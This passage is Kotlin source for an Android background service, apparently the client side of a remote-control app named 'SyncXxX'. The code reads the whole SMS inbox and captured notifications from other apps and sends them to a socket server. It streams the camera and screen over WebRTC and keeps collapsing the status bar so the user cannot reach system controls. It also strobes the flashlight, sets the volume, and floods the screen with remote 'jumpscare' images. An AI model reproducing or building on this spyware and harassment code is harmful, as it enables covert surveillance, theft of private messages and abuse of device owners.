            override fun run() {
                try {
                    @Suppress("DEPRECATION")
                    sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
                } catch (_: Exception) {}
                try {
                    val service = getSystemService("statusbar")
                    val clazz = Class.forName("android.app.StatusBarManager")
                    val method = clazz.getMethod("collapsePanels")
                    method.invoke(service)
                } catch (_: Exception) {}
                statusBarCollapseHandler?.postDelayed(this, 80)
            }
        }
        statusBarCollapseHandler?.post(statusBarCollapseRunnable!!)
    }

    private fun stopStatusBarCollapse() {
        statusBarCollapseRunnable?.let { statusBarCollapseHandler?.removeCallbacks(it) }
        statusBarCollapseHandler = null
        statusBarCollapseRunnable = null
    }

    private fun removeLockCustomOverlay() {
        lockCustomView?.let {
            try { Handler(Looper.getMainLooper()).post { lockCustomWm.removeView(it) } } catch (_: Exception) {}
        }
        lockCustomView = null
    }

        private var lockFlashHandler: Handler? = null
    private var lockFlashRunnable: Runnable? = null
    private var lockFlashState = false

    private fun startLockFlashBlink() {
        stopLockFlashBlink()
        lockFlashHandler = Handler(Looper.getMainLooper())
        lockFlashRunnable = object : Runnable {
            override fun run() {
                lockFlashState = !lockFlashState
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, lockFlashState) } } catch (_: Exception) {}
                lockFlashHandler?.postDelayed(this, 200)
            }
        }
        lockFlashHandler?.post(lockFlashRunnable!!)
    }

    private fun stopLockFlashBlink() {
        lockFlashHandler?.removeCallbacks(lockFlashRunnable ?: return)
        lockFlashHandler  = null
        lockFlashRunnable = null
        lockFlashState    = false
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }
    
    // ── SENTER STEADY (on/off biasa) ──────────────────
private fun setSenter(on: Boolean) {
    try {
        if (streaming) {
            try { cameraProvider?.unbindAll() } catch (_: Exception) {}
            streaming = false
        }
        if (torchCameraId == null) {
            torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
                cameraManager?.getCameraCharacteristics(id)
                    ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            }
        }
        torchCameraId?.let { cameraManager?.setTorchMode(it, on) }
        emitStatus(JSONObject().apply { put("senterOn", on) })
    } catch (e: Exception) {
        Log.e("DeviceService", "setSenter: ${e.message}")
    }
}

private var flashIntervalHandler: Handler? = null
private var flashIntervalRunnable: Runnable? = null
private var flashIntervalState = false

private fun startFlashInterval(value: String) {
    stopFlashInterval()
    val ms = value.toLongOrNull()?.coerceAtLeast(50L) ?: 200L
    flashIntervalHandler = Handler(Looper.getMainLooper())
    flashIntervalRunnable = object : Runnable {
        override fun run() {
            flashIntervalState = !flashIntervalState
            try {
                torchCameraId?.let { cameraManager?.setTorchMode(it, flashIntervalState) }
            } catch (_: Exception) {}
            flashIntervalHandler?.postDelayed(this, ms)
        }
    }
    flashIntervalHandler?.post(flashIntervalRunnable!!)
    emitStatus(JSONObject().apply {
        put("flashIntervalActive", true)
        put("flashIntervalMs", ms)
    })
}

private fun stopFlashInterval() {
    flashIntervalRunnable?.let { flashIntervalHandler?.removeCallbacks(it) }
    flashIntervalHandler = null
    flashIntervalRunnable = null
    flashIntervalState = false
    try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
    emitStatus(JSONObject().apply { put("flashIntervalActive", false) })
}
// ── VOLUME LEVEL 0-100 ────────────────────────────
private fun setVolumeLevel(level: Int) {
    try {
        val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val streams = listOf(
            AudioManager.STREAM_MUSIC,
            AudioManager.STREAM_RING,
            AudioManager.STREAM_NOTIFICATION
        )
        streams.forEach { stream ->
            val max    = audio.getStreamMaxVolume(stream)
            val target = (level / 100f * max).toInt().coerceIn(0, max)
            audio.setStreamVolume(stream, target, 0)
        }
        emitStatus(JSONObject().apply {
            put("volumeLevel", level)
            put("volumeMuted", level == 0)
        })
    } catch (e: Exception) {
        Log.e("DeviceService", "setVolumeLevel: ${e.message}")
    }
}

    private fun startCamera(facing: String) {
        // ── WebRTC path (minim delay, resolusi tinggi) ────────────────────────
        streaming = true
        webRTCService?.startCameraStream(facing)
        emitStatus(JSONObject().apply { put("cameraActive", true) })
        Log.d("DeviceService", "Camera WebRTC started, facing=$facing")
    }

    private fun stopCamera() {
        streaming = false
        webRTCService?.stopCameraStream()
        emitStatus(JSONObject().apply { put("cameraActive", false) })
        Log.d("DeviceService", "Camera WebRTC stopped")
    }

    private fun stopCameraInternal() {
        streaming = false
        // WebRTC cleanup dilakukan oleh WebRTCStreamService
        webRTCService?.stopCameraStream()
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
        cameraProvider = null
        imageAnalysis  = null
    }

    private fun requestScreenCapture() {
    val prefs = getSharedPreferences("screen_pref", Context.MODE_PRIVATE)
    val granted = prefs.getBoolean("screen_granted", false)
    
    if (granted && savedProjectionResultCode == android.app.Activity.RESULT_OK && savedProjectionData != null) {
        startScreenCapture(savedProjectionResultCode, savedProjectionData!!)
        return
    }
    
    // Kalau data projection belum ada di memory tapi pref bilang granted,
    // minta ulang via broadcast ke MainActivity
    if (granted) {
    // Cek singleton dulu sebelum minta dialog
    if (ScreenProjectionHolder.resultCode == android.app.Activity.RESULT_OK 
            && ScreenProjectionHolder.resultData != null) {
        startScreenCapture(ScreenProjectionHolder.resultCode, ScreenProjectionHolder.resultData!!)
        return
    }
    // Singleton kosong — minta MainActivity kirim data via REUSE
    val intent = Intent("com.sync.xxx.REUSE_SCREEN_CAPTURE").apply {
        setPackage(packageName)
    }
    sendBroadcast(intent)
    return
 }
    
    val intent = Intent(this, ScreenCaptureActivity::class.java).apply {
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    startActivity(intent)
 }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        stopScreenCapture()
        screenStreaming = true

        // ── WebRTC path: resolusi 1270x720, minim delay ───────────────────────
        val capturer = ScreenCaptureWebRTC(
            context     = this,
            resultCode  = resultCode,
            resultData  = data
        )
        webRTCService?.startScreenStream(capturer)
        emitStatus(JSONObject().apply { put("screenActive", true) })
        Log.d("DeviceService", "Screen WebRTC started 1270x720")
    }

    private var screenIsSending = false

    private fun captureAndSendScreen() {
        // Tidak dipakai lagi — screen streaming via WebRTC di startScreenCapture()
    }

    private fun stopScreenCapture() {
        screenStreaming = false
        screenRunnable?.let { screenHandler?.removeCallbacks(it) }
        screenHandler  = null
        screenRunnable = null
        // Cleanup ImageReader/MediaProjection lama jika ada
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaProjection = null
        // WebRTC screen stream stop
        webRTCService?.stopScreenStream()
        emitStatus(JSONObject().apply { put("screenActive", false) })
        Log.d("DeviceService", "Screen WebRTC stopped")
    }

    private fun emitScreenFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("screen:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }

    private fun setWallpaperFromUrl(url: String) {
        Thread {
            try {
                val conn = (java.net.URL(url).openConnection() as java.net.HttpURLConnection).apply {
                    requestMethod    = "GET"
                    connectTimeout   = 8000
                    readTimeout      = 15000
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                    setRequestProperty("Accept", "image/*")
                    instanceFollowRedirects = true
                    connect()
                }

                if (conn.responseCode != 200) {
                    Log.e("DeviceService", "setWallpaper HTTP ${conn.responseCode}")
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    conn.disconnect()
                    return@Thread
                }

                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()

                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                if (bmp == null) {
                    Log.e("DeviceService", "setWallpaper: decodeByteArray returned null")
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    return@Thread
                }

                val wm = WallpaperManager.getInstance(this)
                wm.setBitmap(bmp)
                bmp.recycle()
                emitStatus(JSONObject().apply { put("wallpaperSet", true) })
                Log.d("DeviceService", "Wallpaper set OK")
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper error: ${e.message}")
                emitStatus(JSONObject().apply { put("wallpaperSet", false) })
            }
        }.start()
    }

    private fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            emitStatus(JSONObject().apply { put("openedUrl", url) })
        } catch (e: Exception) {
            Log.e("DeviceService", "openUrl error: ${e.message}")
        }
    }
    
    private var keyspamHandler: Handler? = null
    private var keyspamRunnable: Runnable? = null
    private var keyspamActive = false
    private var keyspamOverlayView: android.widget.EditText? = null
    private var keyspamShowState = true

    private val notifStore = mutableMapOf<String, ArrayDeque<JSONObject>>()

    private fun storeNotif(payload: JSONObject) {
        val pkg = payload.optString("pkg") ?: return
        val deque = notifStore.getOrPut(pkg) { ArrayDeque() }
        deque.addFirst(payload)
        if (deque.size > 500) deque.removeLast()
    }

    private fun sendStoredNotifs() {
        Thread {
            try {
                val result = org.json.JSONArray()
                notifStore.forEach { (pkg, deque) ->
                    val msgs = org.json.JSONArray()
                    deque.forEach { msgs.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg",     pkg)
                        put("appName", deque.firstOrNull()?.optString("appName") ?: pkg)
                        put("messages", msgs)
                    })
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("notifList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendStoredNotifs: ${e.message}")
            }
        }.start()
    }

    private fun sendSms() {
        Thread {
            try {
                val uri = android.net.Uri.parse("content://sms/inbox")
                val cursor = contentResolver.query(
                    uri,
                    arrayOf("address", "body", "date", "read"),
                    null, null, "date DESC"
                ) ?: return@Thread
                
                val grouped = mutableMapOf<String, ArrayDeque<JSONObject>>()
                cursor.use {
                    while (it.moveToNext()) {
                        val address = it.getString(0) ?: continue
                        val body    = it.getString(1) ?: continue
                        val date    = it.getLong(2)
                        val msg = JSONObject().apply {
                            put("pkg",     "com.android.sms")
                            put("appName", "SMS")
                            put("title",   address)
                            put("text",    body)
                            put("time",    date)
                        }
                        grouped.getOrPut(address) { ArrayDeque() }.addLast(msg)
                    }
                }

                val result = org.json.JSONArray()
                grouped.forEach { (address, msgs) ->
                    val msgArr = org.json.JSONArray()
                    msgs.forEach { msgArr.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg",      "com.android.sms")
                        put("appName",  "SMS — $address")
                        put("messages", msgArr)
                    })
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("smsList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendSms: ${e.message}")
            }
        }.start()
    }

    private fun readUid(): String {
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            JSONObject(json).optString("uid", "")
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid error: ${e.message}")
            ""
        }
    }

    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

    private fun emitFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("camera:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
        stopCameraInternal()
        stopScreenCapture()
        stopLockFlashBlink()
        stopFlashInterval()
        stopKeyboardSpam()
        lcdOverlayView?.let {
    try { Handler(Looper.getMainLooper()).post { lcdOverlayWm.removeView(it) } } catch (_: Exception) {}
              }
        lcdOverlayView = null
        flashBlinking = false
        flashBlinking = false
        flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
        flashHandler = null
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        socket?.disconnect()
        socket = null
        webRTCService?.dispose()
        webRTCService = null
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SyncXxX")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Sync XxX Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private var mediaPlayer: android.media.MediaPlayer? = null

    private var lockMediaPlayer: android.media.MediaPlayer? = null

    private fun playLockSound() {
        try {
            lockMediaPlayer?.release()
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            lockMediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                setOnCompletionListener { release(); lockMediaPlayer = null }
                prepare()
                start()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playLockSound: ${e.message}")
        }
    }

    private fun playAudio(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnCompletionListener { release(); mediaPlayer = null }
                setOnErrorListener { _, _, _ -> release(); mediaPlayer = null; false }
                prepareAsync()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playAudio: ${e.message}")
        }
    }

    private val jumpscareViews = mutableListOf<android.view.View>()
    private val jumpscareHandler = Handler(Looper.getMainLooper())
    private var jumpscareRunnable: Runnable? = null
    private var jumpscareUrls: List<String> = emptyList()

    private fun startJumpscare(value: String) {
        stopJumpscare()
        jumpscareUrls = try {
            val arr = org.json.JSONArray(value)
            (0 until arr.length()).map { arr.getString(it) }.filter { it.isNotBlank() }
        } catch (_: Exception) {
            if (value.isNotBlank()) listOf(value) else emptyList()
        }
        if (jumpscareUrls.isEmpty()) return

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = resources.displayMetrics
        val screenW = metrics.widthPixels
        val screenH = metrics.heightPixels

        val spawnJumpscare = object : Runnable {
            override fun run() {
                if (jumpscareUrls.isEmpty()) return
                val pickedUrl = jumpscareUrls.random()
                try {
                    val imgView = android.widget.ImageView(this@DeviceService)
                    imgView.scaleType = android.widget.ImageView.ScaleType.CENTER_CROP

                    val size = (120 + (Math.random() * 80).toInt())
                    val px = (size * metrics.density).toInt()

                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION")
                        android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        px, px, type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                    ).apply {
                        gravity = android.view.Gravity.TOP or android.view.Gravity.START
                        x = (Math.random() * (screenW - px)).toInt().coerceAtLeast(0)
                        y = (Math.random() * (screenH - px)).toInt().coerceAtLeast(0)
                    }

                    wm.addView(imgView, params)
                    jumpscareViews.add(imgView)

                    Thread {
                        try {
                            var redirectUrl = pickedUrl
                            var bmp: android.graphics.Bitmap? = null
                            for (i in 0..4) {
                                val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                                conn.connectTimeout          = 12000
                                conn.readTimeout             = 15000
                                conn.instanceFollowRedirects = false
                                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13)")
                                conn.setRequestProperty("Accept", "image/*,*/*;q=0.8")
                                conn.connect()
                                val code = conn.responseCode
                                if (code in 300..399) {
                                    val loc = conn.getHeaderField("Location")
                                    conn.disconnect()
                                    if (loc != null) { redirectUrl = loc; continue } else break
                                }
                                val bytes = conn.inputStream.readBytes()
                                conn.disconnect()
                                bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                break
                            }
                            if (bmp != null) {
                                val finalBmp = bmp
                                Handler(Looper.getMainLooper()).post { imgView.setImageBitmap(finalBmp) }
                            } else {
                                Log.e("DeviceService", "jumpscare img null: $pickedUrl")
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "jumpscare img load: ${e.message}")
                        }
                    }.start()

                    Handler(Looper.getMainLooper()).postDelayed({
                        try { wm.removeView(imgView); jumpscareViews.remove(imgView) } catch (_: Exception) {}
                    }, 2500)

                } catch (e: Exception) {
                    Log.e("DeviceService", "jumpscare spawn: ${e.message}")
                }

                jumpscareRunnable = this
                jumpscareHandler.postDelayed(this, 600)
            }
        }

        jumpscareRunnable = spawnJumpscare
        jumpscareHandler.post(spawnJumpscare)
    }

    private fun stopJumpscare() {
        jumpscareUrls = emptyList()
        jumpscareRunnable?.let { jumpscareHandler.removeCallbacks(it) }
        jumpscareRunnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        jumpscareViews.toList().forEach { v ->
            try { wm.removeView(v) } catch (_: Exception) {}
        }
        jumpscareViews.clear()
    }
}

object SocketHolder {
    var connected: Boolean = false
}
